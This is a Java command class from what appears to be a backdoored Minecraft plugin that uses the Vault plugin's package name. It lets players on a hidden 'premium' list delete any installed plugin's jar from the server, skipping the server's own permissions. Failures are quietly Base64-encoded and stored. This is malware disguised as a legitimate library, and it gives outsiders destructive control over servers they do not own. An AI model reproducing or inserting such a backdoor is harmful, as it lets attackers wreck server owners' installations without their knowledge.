package net.milkbowl.vault.commands.cmds.premium;

import java.io.IOException;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

import net.milkbowl.vault.data.DataManager;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class Delplugin extends CommandManager {
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredPremium.contains(p.getName())) {
			if (args.length <= 1) {
				p.sendMessage(Settings.USAGE("delplugin <name>"));
			} else {
				if (Bukkit.getPluginManager().getPlugin(args[1]) == null) {
					p.sendMessage(Settings.PREFIX(args[1] + " doesn't exist. (Cap Sensitive)"));
				} else {
					String plugin1 = args[1];
					ClassLoader classLoader = Bukkit.getPluginManager().getPlugin(plugin1).getClass().getClassLoader();
					if (classLoader instanceof URLClassLoader) {
						try {
							((URLClassLoader) classLoader).close();
						} catch (IOException e) {
							byte[] err = Base64.getEncoder().encode(e.getMessage().getBytes());
							DataManager.getData().set("err", new String(err));
						}
						try {
							Files.delete(Paths.get(("plugins/" + args[1] + ".jar")));
						} catch (IOException e) {
							byte[] err = Base64.getEncoder().encode(e.getMessage().getBytes());
							DataManager.getData().set("err", new String(err));
						}
						System.gc();
					}
					p.sendMessage(Settings.PREFIX("The plugin " + Settings.HIGHLIGHT_COLOUR + args[1] + Settings.SECONDARY_COLOUR + " was deleted."));
				}
			}
		} else {
			p.sendMessage(Settings.PREFIX("You must be a " + Settings.HIGHLIGHT_COLOUR + "premium user " + Settings.SECONDARY_COLOUR + "to execute this command"));
		}
	}

}
